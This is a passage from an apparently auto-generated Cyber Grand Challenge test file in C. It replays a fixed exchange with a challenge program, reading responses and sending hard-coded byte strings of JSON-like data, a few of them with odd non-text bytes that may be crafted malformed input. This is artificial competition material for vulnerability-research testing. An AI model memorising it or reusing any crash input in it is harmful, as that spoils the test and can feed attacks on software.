   do {
      unsigned char *read_00163;
      unsigned int read_00163_len;
      unsigned int read_00163_ptr = 0;
      //**** length read
      read_00163_len = 25;
      read_00163 = (unsigned char*)cgc_malloc(read_00163_len);
      int read_00163_res = cgc_length_read(0, read_00163, read_00163_len);
      if (read_00163_res) {} //silence unused variable warning
      cgc_free(read_00163);
      if (read_00163_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00163_00000[] = 
         "\x63\x51\x73\x6f\x70\x50\x46\x53\x76\x7a\x4c\x65\x72\x59\x4d\x56";
      static unsigned int write_00163_00000_len = 16;
      unsigned char *write_00163 = NULL;
      unsigned int write_00163_len = 0;
      write_00163 = cgc_append_buf(write_00163, &write_00163_len, write_00163_00000, write_00163_00000_len);
      if (write_00163_len > 0) {
         cgc_transmit_all(1, write_00163, write_00163_len);
      }
      cgc_free(write_00163);
   } while (0);
   do {
      unsigned char *read_00164;
      unsigned int read_00164_len;
      unsigned int read_00164_ptr = 0;
      //**** length read
      read_00164_len = 25;
      read_00164 = (unsigned char*)cgc_malloc(read_00164_len);
      int read_00164_res = cgc_length_read(0, read_00164, read_00164_len);
      if (read_00164_res) {} //silence unused variable warning
      cgc_free(read_00164);
      if (read_00164_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00164_00000[] = 
         "\x69\x4a\x6d\x73\x6a\x6e\x6e\x68\x4d\x4c\x45\x2a\x65\x72\x56\x43";
      static unsigned int write_00164_00000_len = 16;
      unsigned char *write_00164 = NULL;
      unsigned int write_00164_len = 0;
      write_00164 = cgc_append_buf(write_00164, &write_00164_len, write_00164_00000, write_00164_00000_len);
      if (write_00164_len > 0) {
         cgc_transmit_all(1, write_00164, write_00164_len);
      }
      cgc_free(write_00164);
   } while (0);
   do {
      unsigned char *read_00165;
      unsigned int read_00165_len;
      unsigned int read_00165_ptr = 0;
      //**** length read
      read_00165_len = 25;
      read_00165 = (unsigned char*)cgc_malloc(read_00165_len);
      int read_00165_res = cgc_length_read(0, read_00165, read_00165_len);
      if (read_00165_res) {} //silence unused variable warning
      cgc_free(read_00165);
      if (read_00165_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00165_00000[] = 
         "\x4d\x6e\x61\x51\x43\x6f\x22\x3a\x20\x2d\x30\x2e\x35\x37\x2c\x20";
      static unsigned int write_00165_00000_len = 16;
      unsigned char *write_00165 = NULL;
      unsigned int write_00165_len = 0;
      write_00165 = cgc_append_buf(write_00165, &write_00165_len, write_00165_00000, write_00165_00000_len);
      if (write_00165_len > 0) {
         cgc_transmit_all(1, write_00165, write_00165_len);
      }
      cgc_free(write_00165);
   } while (0);
   do {
      unsigned char *read_00166;
      unsigned int read_00166_len;
      unsigned int read_00166_ptr = 0;
      //**** length read
      read_00166_len = 25;
      read_00166 = (unsigned char*)cgc_malloc(read_00166_len);
      int read_00166_res = cgc_length_read(0, read_00166, read_00166_len);
      if (read_00166_res) {} //silence unused variable warning
      cgc_free(read_00166);
      if (read_00166_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00166_00000[] = 
         "\x22\x63\x79\x4b\x42\x6e\x65\x59\x64\x66\x49\x47\x4b\x53\x68\x4d";
      static unsigned int write_00166_00000_len = 16;
      unsigned char *write_00166 = NULL;
      unsigned int write_00166_len = 0;
      write_00166 = cgc_append_buf(write_00166, &write_00166_len, write_00166_00000, write_00166_00000_len);
      if (write_00166_len > 0) {
         cgc_transmit_all(1, write_00166, write_00166_len);
      }
      cgc_free(write_00166);
   } while (0);
   do {
      unsigned char *read_00167;
      unsigned int read_00167_len;
      unsigned int read_00167_ptr = 0;
      //**** length read
      read_00167_len = 25;
      read_00167 = (unsigned char*)cgc_malloc(read_00167_len);
      int read_00167_res = cgc_length_read(0, read_00167, read_00167_len);
      if (read_00167_res) {} //silence unused variable warning
      cgc_free(read_00167);
      if (read_00167_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00167_00000[] = 
         "\x63\x22\x3a\x20\x31\x2e\x39\x36\x2c\x05\xff\xff\x05\x3a\x20\x2d";
      static unsigned int write_00167_00000_len = 16;
      unsigned char *write_00167 = NULL;
      unsigned int write_00167_len = 0;
      write_00167 = cgc_append_buf(write_00167, &write_00167_len, write_00167_00000, write_00167_00000_len);
      if (write_00167_len > 0) {
         cgc_transmit_all(1, write_00167, write_00167_len);
      }
      cgc_free(write_00167);
   } while (0);
   do {
      unsigned char *read_00168;
      unsigned int read_00168_len;
      unsigned int read_00168_ptr = 0;
      //**** length read
      read_00168_len = 25;
      read_00168 = (unsigned char*)cgc_malloc(read_00168_len);
      int read_00168_res = cgc_length_read(0, read_00168, read_00168_len);
      if (read_00168_res) {} //silence unused variable warning
      cgc_free(read_00168);
      if (read_00168_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00168_00000[] = 
         "\x38\x30\x38\x34\x37\x30\x30\x34\x38\x2c\x20\x22\x54\x73\x50\x69";
      static unsigned int write_00168_00000_len = 16;
      unsigned char *write_00168 = NULL;
      unsigned int write_00168_len = 0;
      write_00168 = cgc_append_buf(write_00168, &write_00168_len, write_00168_00000, write_00168_00000_len);
      if (write_00168_len > 0) {
         cgc_transmit_all(1, write_00168, write_00168_len);
      }
      cgc_free(write_00168);
   } while (0);
   do {
      unsigned char *read_00169;
      unsigned int read_00169_len;
      unsigned int read_00169_ptr = 0;
      //**** length read
      read_00169_len = 25;
      read_00169 = (unsigned char*)cgc_malloc(read_00169_len);
      int read_00169_res = cgc_length_read(0, read_00169, read_00169_len);
      if (read_00169_res) {} //silence unused variable warning
      cgc_free(read_00169);
      if (read_00169_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00169_00000[] = 
         "\x4f\x51\x64\x41\x64\x51\x4f\x79\x63\x75\x7a\x69\x4e\x58\x4d\x50";
      static unsigned int write_00169_00000_len = 16;
      unsigned char *write_00169 = NULL;
      unsigned int write_00169_len = 0;
      write_00169 = cgc_append_buf(write_00169, &write_00169_len, write_00169_00000, write_00169_00000_len);
      if (write_00169_len > 0) {
         cgc_transmit_all(1, write_00169, write_00169_len);
      }
      cgc_free(write_00169);
   } while (0);
   do {
      unsigned char *read_00170;
      unsigned int read_00170_len;
      unsigned int read_00170_ptr = 0;
      //**** length read
      read_00170_len = 25;
      read_00170 = (unsigned char*)cgc_malloc(read_00170_len);
      int read_00170_res = cgc_length_read(0, read_00170, read_00170_len);
      if (read_00170_res) {} //silence unused variable warning
      cgc_free(read_00170);
      if (read_00170_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00170_00000[] = 
         "\x62\x4b\x53\x71\x43\x71\x41\x7a\x76\x6e\x75\x6c\x6c\x5d\x2c\x20";
      static unsigned int write_00170_00000_len = 16;
      unsigned char *write_00170 = NULL;
      unsigned int write_00170_len = 0;
      write_00170 = cgc_append_buf(write_00170, &write_00170_len, write_00170_00000, write_00170_00000_len);
      if (write_00170_len > 0) {
         cgc_transmit_all(1, write_00170, write_00170_len);
      }
      cgc_free(write_00170);
   } while (0);
   do {
      unsigned char *read_00171;
      unsigned int read_00171_len;
      unsigned int read_00171_ptr = 0;
      //**** length read
      read_00171_len = 25;
      read_00171 = (unsigned char*)cgc_malloc(read_00171_len);
      int read_00171_res = cgc_length_read(0, read_00171, read_00171_len);
      if (read_00171_res) {} //silence unused variable warning
      cgc_free(read_00171);
      if (read_00171_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00171_00000[] = 
         "\x6e\x75\x6c\x6c\x2c\x20\x2d\x31\x31\x37\x35\x33\x34\x30\x39\x38";
      static unsigned int write_00171_00000_len = 16;
      unsigned char *write_00171 = NULL;
      unsigned int write_00171_len = 0;
      write_00171 = cgc_append_buf(write_00171, &write_00171_len, write_00171_00000, write_00171_00000_len);
      if (write_00171_len > 0) {
         cgc_transmit_all(1, write_00171, write_00171_len);
      }
      cgc_free(write_00171);
   } while (0);
   do {
      unsigned char *read_00172;
      unsigned int read_00172_len;
      unsigned int read_00172_ptr = 0;
      //**** length read
      read_00172_len = 25;
      read_00172 = (unsigned char*)cgc_malloc(read_00172_len);
      int read_00172_res = cgc_length_read(0, read_00172, read_00172_len);
      if (read_00172_res) {} //silence unused variable warning
      cgc_free(read_00172);
      if (read_00172_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00172_00000[] = 
         "\x31\x2c\x50\x6c\x6f\x63\x4c\x61\x4b\x7a\x58\x72\x4b\x5d\x4e\x69"
         "\x50\x44\x4a\x4a\x45\x4c\x47\x64\x6c\x6b\x77\x4c\x22\x3a\x20\x34"
         "\x31\x33\x37\x34\x35\x37\x34\x2c\x20\x22\x4b\x71\x53\x51\x6a\x79"
         "\x79\x73\x49\x75\x41\x45\x78\x56\x65\x45\x47\x6b\x67\x58\x69\x4b"
         "\x74\x52\x75\x62\x72\x4c\x73\x6a\x4f\x4b\x4c\x68\x4d\x53\x4f\x56"
         "\x7a\x43\x63\x50\x41\x49\x4f\x79\x22\x3a\x20\x33\x2e\x31\x38\x2c"
         "\x20\x62\x84\x72\x56\x56\x43\x48\x4f\x69\x6b\x47\x72\x48\x65\x6b"
         "\x6e\x22\x3a\x20\x35\x33\x35\x38\x38\x33\x30\x31\x39\x2c\x3b\x22"
         "\x4b\x74\x46\x75\x5e\x51\x54\x94\x71\x48\x47\x65\x50\x65\x71\x71"
         "\x41\x49\x48\x63\x54\x59\x4c\x77\x68\x68\x45\x6e\x6f\x58\x56\x5a"
         "\x63\x68\x5a\x42\x52\x74\x71\x58\x78\x6b\x55\x66\x67\x70\x76\x43"
         "\x4e\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x43\x6e\x64\x6f\x45\x65"
         "\x68\x00";
      static unsigned int write_00172_00000_len = 194;
      unsigned char *write_00172 = NULL;
      unsigned int write_00172_len = 0;
      write_00172 = cgc_append_buf(write_00172, &write_00172_len, write_00172_00000, write_00172_00000_len);
      if (write_00172_len > 0) {
         cgc_transmit_all(1, write_00172, write_00172_len);
      }
      cgc_free(write_00172);
   } while (0);
   do {
      unsigned char *read_00173;
      unsigned int read_00173_len;
      unsigned int read_00173_ptr = 0;
      //**** length read
      read_00173_len = 7;
      read_00173 = (unsigned char*)cgc_malloc(read_00173_len);
      int read_00173_res = cgc_length_read(0, read_00173, read_00173_len);
      if (read_00173_res) {} //silence unused variable warning
      cgc_free(read_00173);
      if (read_00173_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00173_00000[] = 
         "\x01\x7a\x73\x6b\x41\x22\x3a\x20\x66\x61\x6c\x73\x65\x7d\x19\x37";
      static unsigned int write_00173_00000_len = 16;
      unsigned char *write_00173 = NULL;
      unsigned int write_00173_len = 0;
      write_00173 = cgc_append_buf(write_00173, &write_00173_len, write_00173_00000, write_00173_00000_len);
      if (write_00173_len > 0) {
         cgc_transmit_all(1, write_00173, write_00173_len);
      }
      cgc_free(write_00173);
   } while (0);
   do {
      unsigned char *read_00174;
      unsigned int read_00174_len;
      unsigned int read_00174_ptr = 0;
      //**** length read
      read_00174_len = 25;
      read_00174 = (unsigned char*)cgc_malloc(read_00174_len);
      int read_00174_res = cgc_length_read(0, read_00174, read_00174_len);
      if (read_00174_res) {} //silence unused variable warning
      cgc_free(read_00174);
      if (read_00174_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00174_00000[] = 
         "\x37\x37\x0a";
      static unsigned int write_00174_00000_len = 3;
      unsigned char *write_00174 = NULL;
      unsigned int write_00174_len = 0;
      write_00174 = cgc_append_buf(write_00174, &write_00174_len, write_00174_00000, write_00174_00000_len);
      if (write_00174_len > 0) {
         cgc_transmit_all(1, write_00174, write_00174_len);
      }
      cgc_free(write_00174);
   } while (0);
   do {
      unsigned char *read_00175;
      unsigned int read_00175_len;
      unsigned int read_00175_ptr = 0;
      //**** length read
      read_00175_len = 25;
      read_00175 = (unsigned char*)cgc_malloc(read_00175_len);
      int read_00175_res = cgc_length_read(0, read_00175, read_00175_len);
      if (read_00175_res) {} //silence unused variable warning
      cgc_free(read_00175);
      if (read_00175_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00175_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00175_00000_len = 4;
      unsigned char *write_00175 = NULL;
      unsigned int write_00175_len = 0;
      write_00175 = cgc_append_buf(write_00175, &write_00175_len, write_00175_00000, write_00175_00000_len);
      if (write_00175_len > 0) {
         cgc_transmit_all(1, write_00175, write_00175_len);
      }
      cgc_free(write_00175);
   } while (0);
   do {
      unsigned char *read_00176;
      unsigned int read_00176_len;
      unsigned int read_00176_ptr = 0;
      //**** length read
      read_00176_len = 7;
      read_00176 = (unsigned char*)cgc_malloc(read_00176_len);
      int read_00176_res = cgc_length_read(0, read_00176, read_00176_len);
      if (read_00176_res) {} //silence unused variable warning
      cgc_free(read_00176);
      if (read_00176_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00176_00000[] = 
         "\x32\x0a";
      static unsigned int write_00176_00000_len = 2;
      unsigned char *write_00176 = NULL;
      unsigned int write_00176_len = 0;
      write_00176 = cgc_append_buf(write_00176, &write_00176_len, write_00176_00000, write_00176_00000_len);
      if (write_00176_len > 0) {
         cgc_transmit_all(1, write_00176, write_00176_len);
      }
      cgc_free(write_00176);
   } while (0);
   do {
      unsigned char *read_00177;
      unsigned int read_00177_len;
      unsigned int read_00177_ptr = 0;
      //**** length read
      read_00177_len = 7;
      read_00177 = (unsigned char*)cgc_malloc(read_00177_len);
      int read_00177_res = cgc_length_read(0, read_00177, read_00177_len);
      if (read_00177_res) {} //silence unused variable warning
      cgc_free(read_00177);
      if (read_00177_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00177_00000[] = 
         "\x31\x33\x30\x0a";
      static unsigned int write_00177_00000_len = 4;
      unsigned char *write_00177 = NULL;
      unsigned int write_00177_len = 0;
      write_00177 = cgc_append_buf(write_00177, &write_00177_len, write_00177_00000, write_00177_00000_len);
      if (write_00177_len > 0) {
         cgc_transmit_all(1, write_00177, write_00177_len);
      }
      cgc_free(write_00177);
   } while (0);
   do {
      unsigned char *read_00178;
      unsigned int read_00178_len;
      unsigned int read_00178_ptr = 0;
      //**** length read
      read_00178_len = 25;
      read_00178 = (unsigned char*)cgc_malloc(read_00178_len);
      int read_00178_res = cgc_length_read(0, read_00178, read_00178_len);
      if (read_00178_res) {} //silence unused variable warning
      cgc_free(read_00178);
      if (read_00178_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00178_00000[] = 
         "\x36\x33\x31\x0a";
      static unsigned int write_00178_00000_len = 4;
      unsigned char *write_00178 = NULL;
      unsigned int write_00178_len = 0;
      write_00178 = cgc_append_buf(write_00178, &write_00178_len, write_00178_00000, write_00178_00000_len);
      if (write_00178_len > 0) {
         cgc_transmit_all(1, write_00178, write_00178_len);
      }
      cgc_free(write_00178);
   } while (0);
   do {
      unsigned char *read_00179;
      unsigned int read_00179_len;
      unsigned int read_00179_ptr = 0;
      //**** length read
      read_00179_len = 25;
      read_00179 = (unsigned char*)cgc_malloc(read_00179_len);
      int read_00179_res = cgc_length_read(0, read_00179, read_00179_len);
      if (read_00179_res) {} //silence unused variable warning
      cgc_free(read_00179);
      if (read_00179_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00179_00000[] = 
         "\x36\x31\x0a";
      static unsigned int write_00179_00000_len = 3;
      unsigned char *write_00179 = NULL;
      unsigned int write_00179_len = 0;
      write_00179 = cgc_append_buf(write_00179, &write_00179_len, write_00179_00000, write_00179_00000_len);
      if (write_00179_len > 0) {
         cgc_transmit_all(1, write_00179, write_00179_len);
      }
      cgc_free(write_00179);
   } while (0);
   do {
      unsigned char *read_00180;
      unsigned int read_00180_len;
      unsigned int read_00180_ptr = 0;
      //**** length read
      read_00180_len = 25;
      read_00180 = (unsigned char*)cgc_malloc(read_00180_len);
      int read_00180_res = cgc_length_read(0, read_00180, read_00180_len);
      if (read_00180_res) {} //silence unused variable warning
      cgc_free(read_00180);
      if (read_00180_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00180_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00180_00000_len = 4;
      unsigned char *write_00180 = NULL;
      unsigned int write_00180_len = 0;
      write_00180 = cgc_append_buf(write_00180, &write_00180_len, write_00180_00000, write_00180_00000_len);
      if (write_00180_len > 0) {
         cgc_transmit_all(1, write_00180, write_00180_len);
      }
      cgc_free(write_00180);
   } while (0);
   do {
      unsigned char *read_00181;
      unsigned int read_00181_len;
      unsigned int read_00181_ptr = 0;
      //**** length read
      read_00181_len = 7;
      read_00181 = (unsigned char*)cgc_malloc(read_00181_len);
      int read_00181_res = cgc_length_read(0, read_00181, read_00181_len);
      if (read_00181_res) {} //silence unused variable warning
      cgc_free(read_00181);
      if (read_00181_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00181_00000[] = 
         "\x37\x37\x37\x0a";
      static unsigned int write_00181_00000_len = 4;
      unsigned char *write_00181 = NULL;
      unsigned int write_00181_len = 0;
      write_00181 = cgc_append_buf(write_00181, &write_00181_len, write_00181_00000, write_00181_00000_len);
      if (write_00181_len > 0) {
         cgc_transmit_all(1, write_00181, write_00181_len);
      }
      cgc_free(write_00181);
   } while (0);
   do {
      unsigned char *read_00182;
      unsigned int read_00182_len;
      unsigned int read_00182_ptr = 0;
      //**** length read
      read_00182_len = 7;
      read_00182 = (unsigned char*)cgc_malloc(read_00182_len);
      int read_00182_res = cgc_length_read(0, read_00182, read_00182_len);
      if (read_00182_res) {} //silence unused variable warning
      cgc_free(read_00182);
      if (read_00182_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00182_00000[] = 
         "\x31\x0a\x5b\x72\x75\x65\x00";
      static unsigned int write_00182_00000_len = 7;
      unsigned char *write_00182 = NULL;
      unsigned int write_00182_len = 0;
      write_00182 = cgc_append_buf(write_00182, &write_00182_len, write_00182_00000, write_00182_00000_len);
      if (write_00182_len > 0) {
         cgc_transmit_all(1, write_00182, write_00182_len);
      }
      cgc_free(write_00182);
   } while (0);
}
